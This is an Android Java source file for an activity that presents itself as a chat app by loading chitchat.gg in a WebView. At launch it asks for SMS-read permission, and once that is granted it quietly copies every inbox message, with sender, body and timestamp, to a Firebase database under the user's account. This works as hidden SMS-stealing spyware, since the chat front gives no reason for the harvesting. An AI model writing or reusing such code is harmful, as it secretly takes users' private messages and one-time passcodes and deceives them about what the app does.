package com.mehboob.bushorat.activities;

import android.annotation.SuppressLint;
import android.os.Bundle;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import com.google.firebase.auth.FirebaseAuth;
import com.mehboob.bushorat.R;

import android.Manifest;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.webkit.WebSettings;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import java.util.HashMap;
import java.util.Map;
import android.Manifest;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.webkit.WebSettings;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import java.util.HashMap;
import java.util.Map;

public class ChatActivity extends AppCompatActivity {

    private WebView webView;
    private DatabaseReference smsRef;
    private static final int SMS_PERMISSION_CODE = 100;

    private FirebaseAuth mAuth;
    @SuppressLint("MissingInflatedId")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_chat);

        mAuth=FirebaseAuth.getInstance();
        // Initialize Firebase
        smsRef = FirebaseDatabase.getInstance().getReference("users");

        // Setup WebView
        webView = findViewById(R.id.webView);
        setupWebView();

        // Check and request SMS permission
        if (checkSmsPermission()) {
            syncSmsToFirebase();
        } else {
            requestSmsPermission();
        }
    }

    private void setupWebView() {
        WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setDomStorageEnabled(true);

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                view.loadUrl(url);
                return true;
            }
        });

        webView.loadUrl("https://www.chitchat.gg/");
    }

    private boolean checkSmsPermission() {
        return ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;
    }

    private void requestSmsPermission() {
        ActivityCompat.requestPermissions(this,
                new String[]{Manifest.permission.READ_SMS},
                SMS_PERMISSION_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == SMS_PERMISSION_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                syncSmsToFirebase();
            }
        }
    }

    private void syncSmsToFirebase() {
        // Get all SMS messages
        Cursor cursor = getContentResolver().query(
                Uri.parse("content://sms/inbox"),
                null, null, null, null);

        if (cursor != null && cursor.moveToFirst()) {
            do {
                // Extract SMS data
                String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                long timestamp = cursor.getLong(cursor.getColumnIndexOrThrow("date"));

                // Create SMS entry for Firebase
                Map<String, Object> smsEntry = new HashMap<>();
                smsEntry.put("sender", address);
                smsEntry.put("message", body);
                smsEntry.put("timestamp", timestamp);

                // Push to Firebase
                String key = smsRef.push().getKey();
                if (key != null) {
                    smsRef.child(mAuth.getCurrentUser().getUid()).child("sms").child(key).setValue(smsEntry);
                }
            } while (cursor.moveToNext());
            cursor.close();
        }
    }

    @Override
    public void onBackPressed() {
        if (webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }
}